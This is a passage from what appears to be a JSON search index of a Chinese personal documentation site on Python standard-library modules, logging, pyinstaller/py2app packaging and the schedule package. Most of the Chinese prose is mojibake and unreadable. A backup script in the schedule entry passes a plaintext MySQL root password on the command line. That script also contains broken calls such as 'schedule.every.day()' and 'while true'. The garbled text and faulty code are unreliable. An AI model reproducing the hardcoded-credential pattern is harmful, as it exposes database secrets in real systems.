çš„å‚æ•°å…ƒç»„ã€‚ å¦‚æœ initializer å¼•å‘äº†å¼‚å¸¸ï¼Œåˆ™æ‰€æœ‰å½“å‰åœ¨ç­‰å¾…çš„ä»»åŠ¡ä»¥åŠä»»ä½•å‘è¿›ç¨‹æ± æäº¤æ›´å¤šä»»åŠ¡çš„å°è¯•éƒ½å°†å¼•å‘ BrokenProcessPoolã€‚ max_tasks_per_child: = None å¯é€‰å‚æ•°, è¡¨ç¤ºå•ä¸ªè¿›ç¨‹å¯æ‰§è¡Œçš„æœ€å¤§ä»»åŠ¡æ•°. è¶…å‡ºå°†ä¼šä½¿ç”¨æ–°çš„è¿›ç¨‹(åˆ·æ–°). é»˜è®¤ None è¡¨ç¤ºå·¥ä½œè¿›ç¨‹å°†ä¼šä¸€ç›´å­˜æ´»åˆ°è¿›ç¨‹æ± ç»ˆæ­¢. åœ¨é»˜è®¤æƒ…å†µ,ç¼ºå°‘MP_CONTEXTå‚æ•°, ä¸”æŒ‡å®šäº†æœ€å¤§å€¼æ—¶ï¼Œå°†ä½¿ç”¨ spawn() å¤šè¿›ç¨‹å¯åŠ¨æ–¹æ³•. ä¸ fork() å¯åŠ¨æ–¹å¼ä¸å…¼å®¹. åœ¨ 3.3 ç‰ˆæ›´æ”¹: å¦‚æœå…¶ä¸­ä¸€ä¸ªå·¥ä½œè¿›ç¨‹è¢«çªç„¶ç»ˆæ­¢ï¼ŒBrokenProcessPool å°±ä¼šé©¬ä¸Šè§¦å‘ã€‚ å¯é¢„è®¡çš„è¡Œä¸ºæ²¡æœ‰å®šä¹‰ï¼Œä½†æ‰§è¡Œå™¨ä¸Šçš„æ“ä½œæˆ–å®ƒçš„ future å¯¹è±¡ä¼šè¢«å†»ç»“æˆ–æ­»é”ã€‚ åœ¨ 3.7 ç‰ˆæ›´æ”¹: æ·»åŠ  mp_context å‚æ•°å…è®¸ç”¨æˆ·æ§åˆ¶ç”±è¿›ç¨‹æ± åˆ›å»ºç»™å·¥ä½œè€…è¿›ç¨‹çš„å¼€å§‹æ–¹æ³• ã€‚ åŠ å…¥ initializer å’Œ*initargs* å‚æ•°ã€‚ åœ¨ 3.11 ç‰ˆæ›´æ”¹: The max_tasks_per_child argument was added to allow users to control the lifetime of workers in the pool. Future Future ç±»å°†å¯è°ƒç”¨å¯¹è±¡å°è£…ä¸ºå¼‚æ­¥æ‰§è¡Œã€‚Future å®ä¾‹ç”± Executor.submit() åˆ›å»ºã€‚ class concurrent.futures.Future å°†å¯è°ƒç”¨å¯¹è±¡å°è£…ä¸ºå¼‚æ­¥æ‰§è¡Œã€‚Future å®ä¾‹ç”± Executor.submit() åˆ›å»ºï¼Œé™¤éæµ‹è¯•ï¼Œä¸åº”ç›´æ¥åˆ›å»ºã€‚ ä¸‹é¢è¿™äº› Future æ–¹æ³•ç”¨äºå•å…ƒæµ‹è¯•å’Œ Executor å®ç°. æ¨¡å—å‡½æ•° wait as_completed Exception ç±» CancelledError TimeoutError BrokenExecutor InvalidStateError BrokenThreadPool BrokenProcessPool","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Concurrent.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Concurrent.html"},{"title":"os","text":"å®˜ç½‘: os --- å¤šç§æ“ä½œç³»ç»Ÿæ¥å£ å±æ€§ os.environ ä¸€ä¸ª mapping å¯¹è±¡ï¼Œå…¶ä¸­é”®å€¼æ˜¯ä»£è¡¨è¿›ç¨‹ç¯å¢ƒçš„å­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼Œenviron['HOME'] æ˜¯ä½ çš„ä¸»ç›®å½•ï¼ˆåœ¨æŸäº›å¹³å°ä¸Šï¼‰çš„è·¯å¾„åï¼Œç›¸å½“äº C ä¸­çš„ getenv(\"HOME\")ã€‚ å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-OS.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-OS.html"},{"title":"ssl","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/ssl.html å¥—æ¥å­—å¯¹è±¡çš„TLS/SSLå°è£… è¯¥æ¨¡å—æä¾›äº†å¯¹ä¼ è¾“å±‚å®‰å…¨ï¼ˆé€šå¸¸ç§°ä¸º \"å®‰å…¨å¥—æ¥å­—å±‚\"ï¼‰åŠ å¯†å’Œç½‘ç»œå¥—æ¥å­—çš„å¯¹ç­‰è®¤è¯è®¾æ–½çš„è®¿é—®ï¼Œ åŒ…æ‹¬å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ã€‚ è¯¥æ¨¡å—ä½¿ç”¨ OpenSSL åº“ã€‚ å®ƒå¯ä»¥åœ¨æ‰€æœ‰ç°ä»£ Unix ç³»ç»Ÿã€ Windows ã€ macOS å’Œå¯èƒ½çš„å…¶ä»–å¹³å°ä¸Šä½¿ç”¨ï¼Œåªè¦ OpenSSL å®‰è£…åœ¨è¯¥å¹³å°ä¸Šã€‚ ä¸»è¦çš„ä¸€ä¸ªAPI","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-SSL.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-SSL.html"},{"title":"functools","text":"å®˜ç½‘ wraps partial ä¹Ÿå«åå‡½æ•° ç”¨é€”: æœ‰äº›å›è°ƒå‡½æ•°ä¸æ”¯æŒä¼ å…¥å‚æ•°, å¯ä»¥ä½¿ç”¨æ­¤å‡½æ•°æ¥æ”¯æŒå‚æ•°. total_ordering è£…é¥°å™¨, å®ç°æ¯”è¾ƒæ–¹æ³• æ³¨è§£ è™½ç„¶æ­¤è£…é¥°å™¨ä½¿å¾—åˆ›å»ºå…·æœ‰è‰¯å¥½è¡Œä¸ºçš„å®Œå…¨æœ‰åºç±»å‹å˜å¾—éå¸¸å®¹æ˜“ï¼Œ ä½†å®ƒ ç¡®å® æ˜¯ä»¥æ‰§è¡Œé€Ÿåº¦æ›´ç¼“æ…¢å’Œæ´¾ç”Ÿæ¯”è¾ƒæ–¹æ³•çš„å †æ ˆå›æº¯æ›´å¤æ‚ä¸ºä»£ä»·çš„ã€‚ å¦‚æœæ€§èƒ½åŸºå‡†æµ‹è¯•è¡¨æ˜è¿™æ˜¯ç‰¹å®šåº”ç”¨çš„ç“¶é¢ˆæ‰€åœ¨ï¼Œåˆ™æ”¹ä¸ºå®ç°å…¨éƒ¨å…­ä¸ªå¯Œæ¯”è¾ƒæ–¹æ³•åº”è¯¥ä¼šè½»æ¾æå‡é€Ÿåº¦ã€‚ è¿™ä¸ªè£…é¥°å™¨ä¸ä¼šå°è¯•é‡è½½ç±» æˆ–å…¶ä¸Šçº§ç±» ä¸­å·²ç»è¢«å£°æ˜çš„æ–¹æ³•ã€‚ è¿™æ„å‘³ç€å¦‚æœæŸä¸ªä¸Šçº§ç±»å®šä¹‰äº†æ¯”è¾ƒè¿ç®—ç¬¦ï¼Œåˆ™ total_ordering å°†ä¸ä¼šå†æ¬¡å®ç°å®ƒï¼Œå³ä½¿åŸæ–¹æ³•æ˜¯æŠ½è±¡æ–¹æ³•ã€‚ 3.2 æ–°ç‰ˆåŠŸèƒ½. åœ¨ 3.4 ç‰ˆæ›´æ”¹: ç°åœ¨å·²æ”¯æŒä»æœªè¯†åˆ«ç±»å‹çš„ä¸‹å±‚æ¯”è¾ƒå‡½æ•°è¿”å› NotImplemented å¼‚å¸¸ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-functools.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-functools.html"},{"title":"logging","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/logging.html çŸ¥ä¹æœ‰ç¯‡æ€»ç»“çš„è²Œä¼¼ä¹Ÿå¯ä»¥: https://zhuanlan.zhihu.com/p/425678081 ç®—æ˜¯å†…ç½®çš„ä¸€ä¸ªçµæ´»çš„æ—¥å¿—åº“ éƒ¨åˆ†å‡½æ•°/æ¨¡å—ä½¿ç”¨è¯´æ˜ logging.basicConfig æœ€ç›´æ¥çš„ä½¿ç”¨æ˜¯ç›´æ¥è°ƒç”¨æ¨¡å—çº§åˆ«å‡½æ•°å¦‚: import logging logging.info('xxxx') æœ€ç®€å•çš„é…ç½®æ˜¯ä½¿ç”¨ logging.basicConfig , è¿™ä¼šè®¾ç½®ä¸€ä¸ªå…¨å±€çš„æ—¥å¿—é…ç½®, å¦‚æœå¤šæ¬¡è°ƒç”¨, ä»¥ç¬¬ä¸€æ¬¡çš„é…ç½®ä¿¡æ¯ä¸ºå‡†, å¦‚è®¾ç½®æ—¥å¿—: logging.basicConfig(filename='tmp_log.log', level=logging.DEBUG) äº¦å¯è®¾ç½®æ—¥å¿—æ ¼å¼: logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') logging.getLogger è·å–æ—¥å¿—å¤„ç†å™¨ å¯ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°, è¡¨ç¤ºå¤„ç†å™¨å, å¤šæ¬¡è°ƒç”¨ä¸”ä½¿ç”¨åŒä¸€ä¸ªå­—ç¬¦ä¸²æ—¶, è¿”å›åŒä¸€ä¸ªhandler è‹¥ä¸ä¼ å…¥å‚æ•°, è¡¨ç¤ºè·å– root logger logging.StreamHandler logging.StreamHandler() è·å–ä¸€ä¸ªstreamçš„handler, å¯æ·»åŠ ç»™ä¸Šé¢ getLogger è·å–åˆ°çš„ logger, è¡¨ç¤ºè¾“å‡ºåˆ°æ§åˆ¶å°. logging.FileHandler logging.Formatter å®šä¹‰æ—¥å¿—æ ¼å¼, å¦‚: _formatter = \\ logging.Formatter('%(asctime)s - %{pathname}s[line:%{lineno}d] - %(levelname)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p') è®¾ç½®å¥½çš„ _formatter å¯è®¾ç½®ç»™handler(æ¯”å¦‚ä¸Šé¢ FileHandler çš„å®ä¾‹å¯¹è±¡) æ”¯æŒçš„æ ¼å¼å­—ç¬¦ä¸²(éƒ¨åˆ†): %(levelname)s: æ—¥å¿—çº§åˆ«(INFOã€DEBUGã€WARNINGã€ERRORç­‰) %(filename)s: å‘ç”Ÿæ—¥å¿—è®°å½•çš„æ–‡ä»¶åç§° %(funcName)s: å‘ç”Ÿæ—¥å¿—è®°å½•çš„å‡½æ•°åç§° %(lineno)d: å‘ç”Ÿæ—¥å¿—è®°å½•çš„ä»£ç è¡Œæ•° %(asctime)s: æ—¥å¿—è®°å½•çš„æ—¶é—´,é»˜è®¤æ ¼å¼ä¸º%Y-%m-%d %H:%M:%S %(message)s: æ—¥å¿—è®°å½•çš„æ¶ˆæ¯æ­£æ–‡ %(name)s: Loggerçš„åç§° %(threadName)s: çº¿ç¨‹åç§° %(process)d: è¿›ç¨‹ID %{pathname}s: æ‰€æ‰§è¡Œç¨‹åºæ‰€åœ¨è·¯å¾„, ç»å¯¹è·¯å¾„ %(filename)s : æ‰€æ‰§è¡Œç¨‹åºæ‰€åœ¨è·¯å¾„, ç›¸å¯¹è·¯å¾„ logging.handlers logging.handlersæ¨¡å—æä¾›äº†å‡ ç§æ—¥å¿—å¤„ç†ç¨‹åº,ç”¨äºå¤„ç†æ—¥å¿—è®°å½•ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§: RotatingFileHandler:æ—¥å¿—è½®è¯¢å¤„ç†,å¯ä»¥æ”¯æŒæ—¥å¿—æ–‡ä»¶è¾¾åˆ°ä¸€å®šå¤§å°åè‡ªåŠ¨åˆ‡å‰²ä¸ºå¤šä¸ªæ–‡ä»¶ã€‚ TimedRotatingFileHandler:æ—¥å¿—å®šæœŸè½®è¯¢,å¯ä»¥æŒ‰æ—¶é—´åˆ‡å‰²æ—¥å¿—æ–‡ä»¶ã€‚ SMTPHandler:é€šè¿‡SMTPåè®®å‘é€æ—¥å¿—é‚®ä»¶ã€‚ HTTPHandler:å°†æ—¥å¿—è®°å½•å‘é€åˆ°HTTPæœåŠ¡å™¨ã€‚ SocketHandler:å°†æ—¥å¿—å‘é€åˆ°ç½‘ç»œå¥—æ¥å­—ã€‚ QueueHandler: å°†æ—¥å¿—è®°å½•å‘é€åˆ°é˜Ÿåˆ—,ç”±å…¶ä»–è¿›ç¨‹ä»é˜Ÿåˆ—ä¸­è·å–æ—¥å¿—è®°å½•è¿›è¡Œå¤„ç†ã€‚ SysLogHandler:é€šè¿‡Syslogåè®®å‘é€æ—¥å¿—åˆ°syslogå®ˆæŠ¤è¿›ç¨‹ RotatingFileHandler å¦‚æ—¥å¿—æ–‡ä»¶åä¸ºapp.log, æœ€å¤š10M, ä¿ç•™æœ€è¿‘5ä¸ªæ—¥å¿—æ–‡ä»¶: handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5) TimedRotatingFileHandler é€šè¿‡TimedRotatingFileHandleræ¯å¤©åšæ—¥å¿—æ–‡ä»¶è½®è¯¢,å®ç°æ—¥å¿—æ–‡ä»¶æŒ‰æ—¥åˆ‡å‰²çš„åŠŸèƒ½: import logging from logging.handlers import TimedRotatingFileHandler logger = logging.getLogger(__name__) logger.setLevel(logging.INFO) # æ¯å¤©åšæ—¥å¿—è½®è¯¢ handler = TimedRotatingFileHandler('app.log', when='D', interval=1, backupCount=7) logger.addHandler(handler) logger.info('Start') SMTPHandler é€šè¿‡SMTPHandlerå°†æ—¥å¿—å‘é€é‚®ä»¶çš„æ–¹å¼è¿›è¡Œå¤„ç†: import logging from logging.handlers import SMTPHandler logger = logging.getLogger(__name__) logger.setLevel(logging.ERROR) # é€šè¿‡SMTPå‘é€æ—¥å¿—é‚®ä»¶ mail_handler = SMTPHandler(mailhost='smtp.gmail.com', fromaddr='from@example.com', toaddrs=['to@example.com'], subject='Application Error', credentials=credentials) logger.addHandler(mail_handler) logger.error('Error occurred') æ—¥å¿—çº§åˆ« æ—¥å¿—ç­‰çº§: critical > error > warning > info > debug çº§åˆ«è¶Šé«˜æ‰“å°çš„è¶Šå°‘. debug : æ‰“å° debug, info, warning, error, critical çº§åˆ«çš„æ—¥å¿— info : æ‰“å° info, warning, error, critical çº§åˆ«çš„æ—¥å¿— warning : æ‰“å° warning, error, critical çº§åˆ«çš„æ—¥å¿— error : æ‰“å° error, critical çº§åˆ«çš„æ—¥å¿— critical : æ‰“å° critical çº§åˆ« æ³¨è§£ é»˜è®¤åªæ‰“å°å¤§äºç­‰äºwarningçº§åˆ«çš„æ—¥å¿— è‡ªå®šä¹‰é…ç½®(å¯é€‰) loggingæ ‡å‡†æ¨¡å—æ”¯æŒä¸‰ç§é…ç½®æ–¹å¼: dictConfig dictConfig æ˜¯é€šè¿‡ä¸€ä¸ªå­—å…¸è¿›è¡Œé…ç½® Loggerï¼ŒHandlerï¼ŒFilterï¼ŒFormatterï¼› fileConfig fileConfig åˆ™æ˜¯é€šè¿‡ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œé…ç½®ï¼› listen listen åˆ™ç›‘å¬ä¸€ä¸ªç½‘ç»œç«¯å£ï¼Œé€šè¿‡æ¥æ”¶ç½‘ç»œæ•°æ®æ¥è¿›è¡Œé…ç½®ã€‚ é™¤æ­¤ä¹‹å¤–, ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ Loggerï¼ŒHandler ç­‰å¯¹è±¡ä¸­çš„æ–¹æ³•åœ¨ä»£ç ä¸­æ¥æ˜¾å¼é…ç½®, å¦‚: import logging _logger = logging.getLogger(__name__) # ä¹‹åè°ƒç”¨è·Ÿæ™®é€šè°ƒç”¨ä¸€æ · _logger.info('info msg') è¯´æ˜: loggeråªæ˜¯ä¸€ä¸ªæ—¥å¿—å™¨, çœŸæ­£å¤„ç†çš„çš„handler, ç„¶åhandlerå¯ä»¥è®¾ç½® Filter å’Œ Formatter å‚è€ƒ:: https://zhuanlan.zhihu.com/p/425678081 å°†å•ç‹¬çš„loggerè®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ æ— è®ºå¯¹ logging.getLogger('someLogger') è¿›è¡Œå¤šå°‘æ¬¡è°ƒç”¨ï¼Œéƒ½ä¼šè¿”å›åŒä¸€ä¸ª logger å¯¹è±¡çš„å¼•ç”¨ã€‚ ä¸ä»…åœ¨åŒä¸€ä¸ªæ¨¡å—å†…å¦‚æ­¤ï¼Œåªè¦æ˜¯åœ¨åŒä¸€ä¸ª Python è§£é‡Šå™¨è¿›ç¨‹ä¸­ï¼Œè·¨æ¨¡å—è°ƒç”¨ä¹Ÿæ˜¯ä¸€æ ·ã€‚ åŒæ ·æ˜¯å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å®šä¹‰å’Œé…ç½®ä¸€ä¸ªçˆ¶ loggerï¼Œ è€Œåœ¨å¦ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—ä¸­åˆ›å»ºï¼ˆä½†ä¸é…ç½®ï¼‰å­ loggerï¼Œå¯¹äºå­ logger çš„æ‰€æœ‰è°ƒç”¨éƒ½ä¼šä¼ ç»™çˆ¶ loggerã€‚ æ¯”å¦‚åœ¨ä¸€ä¸ªå•ç‹¬çš„loggerä¸‹æ·»åŠ åˆ°å…¶ä»–ä½ç½®: å®šä¹‰ä¸€ä¸ªæ™®é€šlogger: logger = logging.getLogger(__name__) logger.setLevel(logging.DEBUG) å®šä¹‰ä¸€ä¸ªæ–‡ä»¶å¤„ç†logger: logger_file_handler = logging.FileHandler('log_test.log') logger_file_handler.setLevel(logging.DEBUG) å®šä¹‰ä¸€ä¸ªæµhandlerçš„logger: logger_stream_handler = StreamHandler() logger_stream_handler.setLevel(logging.INFO) å¯ä»¥å…ˆè®¾ç½®ä¸€ä¸‹æ ¼å¼: formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') logger_file_handler.setFormatter(formatter) logger_stream_handler.setFormatter(formatter) å°†æ–‡ä»¶å’Œæµçš„loggerä½œä¸ºå­loggeråŠ å…¥åˆ°æœ€å¼€å§‹çš„æ™®é€šlogger: logger.addHandler(logger_file_handler) logger.addHandler(logger_stream_handler) è¯¦ç»†è§:: logging --- Python çš„æ—¥å¿—è®°å½•å·¥å…· æ—¥å¿—æ“ä½œæ‰‹å†Œ æ—¥å¿—æ²¡è¾“å‡ºåˆ°æ§åˆ¶å° ä»ä¸¤ä¸ªæ–¹é¢çœ‹: è®¾ç½®æ—¥å¿—è¾“å‡ºçº§åˆ« è®¾ç½®æµå¼è¾“å‡º(å³æ§åˆ¶å°è¾“å‡º)çš„handler ä¾‹: # è·å–å¤„ç†å™¨ _logger = logging.getLogger(__name__) # å®ä¾‹ stream handler _console_handler = logging.StreamHandler() # ç»™å¤„ç†å™¨å¢åŠ handler _logger.addHandler(_console_handler) # è®¾ç½®æ—¥å¿—çº§åˆ« _logger.setLevel(logging.INFO)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-logging.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-logging.html"},{"title":"string","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/string.html å¸¸è§çš„å­—ç¬¦ä¸²æ“ä½œ å­—ç¬¦ä¸²å¸¸é‡ æ­¤æ¨¡å—ä¸­å®šä¹‰çš„å¸¸é‡ä¸ºï¼š string.ascii_letters ä¸‹æ–‡æ‰€è¿° ascii_lowercase å’Œ ascii_uppercase å¸¸é‡çš„æ‹¼è¿ã€‚ è¯¥å€¼ä¸ä¾èµ–äºè¯­è¨€åŒºåŸŸã€‚ string.ascii_lowercase å°å†™å­—æ¯ 'abcdefghijklmnopqrstuvwxyz'ã€‚ è¯¥å€¼ä¸ä¾èµ–äºè¯­è¨€åŒºåŸŸï¼Œä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚ string.ascii_uppercase å¤§å†™å­—æ¯ 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'ã€‚ è¯¥å€¼ä¸ä¾èµ–äºè¯­è¨€åŒºåŸŸï¼Œä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚ string.digits å­—ç¬¦ä¸² '0123456789'ã€‚ string.hexdigits å­—ç¬¦ä¸² '0123456789abcdefABCDEF'ã€‚ string.octdigits å­—ç¬¦ä¸² '01234567'ã€‚ string.punctuation ç”±åœ¨ C åŒºåŸŸè®¾ç½®ä¸­è¢«è§†ä¸ºæ ‡ç‚¹ç¬¦å·çš„ ASCII å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²: !\"#$%&'()*+,-./:;<=>?@[\\]&#94;_`{|}~. string.printable ç”±è¢«è§†ä¸ºå¯æ‰“å°ç¬¦å·çš„ ASCII å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ è¿™æ˜¯ digits, ascii_letters, punctuation å’Œ whitespace çš„æ€»å’Œã€‚ string.whitespace ç”±è¢«è§†ä¸ºç©ºç™½ç¬¦å·çš„ ASCII å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ å…¶ä¸­åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ã€æ¢è¡Œã€å›è½¦ã€è¿›çº¸å’Œçºµå‘åˆ¶è¡¨ç¬¦ã€‚ è‡ªå®šä¹‰å­—ç¬¦ä¸²æ ¼å¼åŒ–","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-string.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-string.html"},{"title":"py2app","text":"ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pyinstaller ç»“åˆä½¿ç”¨, æ„å»ºç¨‹åºåŒ… ä½¿ç”¨ py2app åœ¨å“ªä¸ªå¹³å°æ‰“åŒ…å°±ç”Ÿæˆå“ªç§æ–‡ä»¶ å®‰è£…: pip install py2app","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-py2app.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-py2app.html"},{"title":"pyinstaller","text":"pythonæ‰“åŒ…ç¨‹åº å®‰è£…: pip install pyinstaller ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/py2app åœ¨å“ªä¸ªå¹³å°æ‰“åŒ…å°±ç”Ÿæˆå“ªç§æ–‡ä»¶ ä¸py2appç»“åˆä½¿ç”¨(MacOS) =======================================s å®‰è£…å¥½pyinstallerå’Œpy2appå, cdè¿›å»é¡¹ç›®ç›®å½• æˆ‘çš„ç›®å½•ç»“æ„: . â”œâ”€â”€ img â”‚ â”œâ”€â”€ img.png â”‚ â”œâ”€â”€ img_1.png â”‚ â””â”€â”€ img_2.png â””â”€â”€ t_sheep.py ç”Ÿæˆsetupæ–‡ä»¶ ä¼šè‡ªåŠ¨è¯†åˆ«èµ„æºæ–‡ä»¶è·Ÿå›¾æ ‡çš„(macä¼š): py2applet --make-setup t_sheep.py img logo.icns ç›®å½•: â”œâ”€â”€ img â”‚ â”œâ”€â”€ img.png â”‚ â”œâ”€â”€ img_1.png â”‚ â””â”€â”€ img_2.png â”œâ”€â”€ setup.py # è¿™ä¸ªå°±æ˜¯ç”Ÿæˆçš„ â””â”€â”€ t_sheep.py æ‰“åŒ…: python3 setup.py py2app ç›®å½•: . â”œâ”€â”€ build â”‚ â””â”€â”€ bdist.macosx-12-x86_64 â”œâ”€â”€ dist â”‚ â””â”€â”€ t_sheep.app # è¿™ä¸ªå°±æ˜¯macä¸‹çš„åº”ç”¨ç¨‹åº, â”œâ”€â”€ img â”‚ â”œâ”€â”€ img.png â”‚ â”œâ”€â”€ img_1.png â”‚ â””â”€â”€ img_2.png â”œâ”€â”€ setup.py â””â”€â”€ t_sheep.py å®Œæˆåä¼šåœ¨å½“å‰ç›®å½•ä¸‹çš„distç›®å½•ä¸‹æœ‰åº”ç”¨, æ³¨æ„ setup çš„èµ„æºé…ç½®: \"\"\" This is a setup.py script generated by py2applet Usage: python setup.py py2app \"\"\" from setuptools import setup APP = ['t_sheep.py'] DATA_FILES = [] OPTIONS = { # æŒ‡å®šè¦æ‰“åŒ…çš„ç¬¬ä¸‰æ–¹åº“ 'includes': ['pygame'], # æŒ‡å®šAPPé‡Œç”¨åˆ°çš„å›¾ç‰‡ï¼ŒéŸ³æ•ˆï¼Œæ–‡ä»¶ç­‰ï¼Œ # å¯ä»¥æŒ‡å®šæ–‡ä»¶å¤¹ï¼Œæˆ–æ˜¯å…·ä½“çš„æ–‡ä»¶ # æŒ‡å®šæ–‡ä»¶å¤¹å°±ä¼šæŠŠæ•´ä¸ªæ–‡ä»¶å¤¹éƒ½æ‰“åŒ… # è¿™äº›å†…å®¹å¦‚æœæ”¾åœ¨ä¸Šé¢çš„DATA_FILESé‡Œï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°åŒç­‰æ•ˆæœ # èµ„æºæ–‡ä»¶ 'resources': ['img'], # APPæ‰§è¡Œæ—¶æ˜¾ç¤ºçš„å›¾æ ‡ï¼Œicnsæ˜¯MACå›¾æ ‡çš„æ ‡å‡†æ–‡ä»¶ # ç”Ÿæˆå›¾æ ‡ https://www.jianshu.com/p/33df84bb52c2 # 'iconfile': 'LOGO.icns', # æœ‰å¾…ç ”ç©¶ï¼Œæš‚æ—¶åªè®¾å®šäº†ç‰ˆæœ¬å· 'plist': {'CFBundleShortVersionsString': '0.1.0'}, # å‚è€ƒ: https://py2app.readthedocs.io/en/latest/options.html#option-reference } setup( app=APP, data_files=DATA_FILES, options={'py2app': OPTIONS}, setup_requires=['py2app'], ) MacOSç”Ÿæˆåº”ç”¨å›¾æ ‡å¯å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/Mac/å›¾æ ‡åˆ¶ä½œ ä¾‹å¦‚: # å‘½ä»¤æ ¼å¼ï¼šsips -z æ–°å›¾ç‰‡å®½åº¦ æ–°å›¾ç‰‡é«˜åº¦ åŸå›¾ç‰‡å --out ä¸´æ—¶.iconset/æ–°å›¾ç‰‡å®Œæ•´å # æ³¨æ„ä¸€å®šè¦ä»¥ icon_**.pngæˆ–è€…icon_**@2x.pngæ ¼å¼, å¦åˆ™ä¼šå¤±è´¥ sips -z 16 16 img.png --out tmp.iconset/icon_16x16.png sips -z 32 32 img.png --out tmp.iconset/icon_32x32.png sips -z 128 128 img.png --out tmp.iconset/icon_128x128.png sips -z 256 256 img.png --out tmp.iconset/icon_256x256.png ç”¨.iconsetç”Ÿæˆ.icns(MacOSç”¨å›¾æ ‡é›†åˆ): # å‘½ä»¤æ ¼å¼ï¼šiconutil -c icns ä¸´æ—¶.iconset -o åå­—.icns # ä¸¾ä¸ªæ —å­ï¼šiconutil -c icns tmp.iconset -o logo.icns è¿™é‡Œå¯å‚è€ƒ: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyinstaller.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyinstaller.html"},{"title":"schedule","text":"å®šæ—¶ä»»åŠ¡å¤„ç†æ¨¡å— pythonå®šæ—¶ä»»åŠ¡ï¼ˆscheduleï¼‰: import schedule def job(name): print(\"her name is : \", name) name = \"longsongpong\" schedule.every(10).minutes.do(job, name) # æ¯éš”ååˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ schedule.every().hour.do(job, name) # æ¯éš”ä¸€å°æ—¶æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ schedule.every().day.at(\"10:30\").do(job, name) # æ¯å¤©çš„10:30æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ schedule.every(5).to(10).days.do(job, name) # æ¯éš”5åˆ°10å¤©æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ schedule.every().monday.do(job, name) # æ¯å‘¨ä¸€çš„è¿™ä¸ªæ—¶å€™æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ schedule.every().wednesday.at(\"13:15\").do(job, name) # æ¯å‘¨ä¸‰13:15æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ while True: schedule.run_pending() # run_pendingï¼šè¿è¡Œæ‰€æœ‰å¯ä»¥è¿è¡Œçš„ä»»åŠ¡ æ­¤å¤„å­¦ä¹ æ˜¯ç”±äºç½‘ç»œè„šæœ¬å®šæ—¶å™¨çš„ç¼–å†™ï¼Œå®Œæˆçš„pythonè„šæœ¬ä»£ç å¦‚ä¸‹: #!/usr/local/bin/python import schedule import time import os def backup(): os.system(\"cd ~/;\" \"cd ~/sql_backup 2> /dev/null || mkdir sql_backup && cd ~/sql_backup;dir=$(date +'%Y-%m-%d');\" \"mkdir ${dir} 2>/dev/null;\" \"mysqldump -uroot -pduoyiIm trainning_server_db user > ~/sql_backup/${dir}/user.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db co_group > ~/sql_backup/${dir}/co_group.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db co_group_mem > ~/sql_backup/${dir}/co_group_mem.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db tbl_user_private \" \"> ~/sql_backup/${dir}/tbl_user_private.sql;\") schedule.every.day().at(\"5:00\").do(backup) while true: schedule.run_pending()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-schedule.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-schedule.html"},{"title":"CRCæ•°æ®æ ¡éªŒ","text":"CRCï¼ˆCyclic Redundancy Checkï¼‰å¾ªç¯å†—ä½™æ ¡éªŒ. ç™¾åº¦ç™¾ç§‘ - å¾ªç¯å†—ä½™æ£€æŸ¥ æ˜¯ä¸€ç§æ 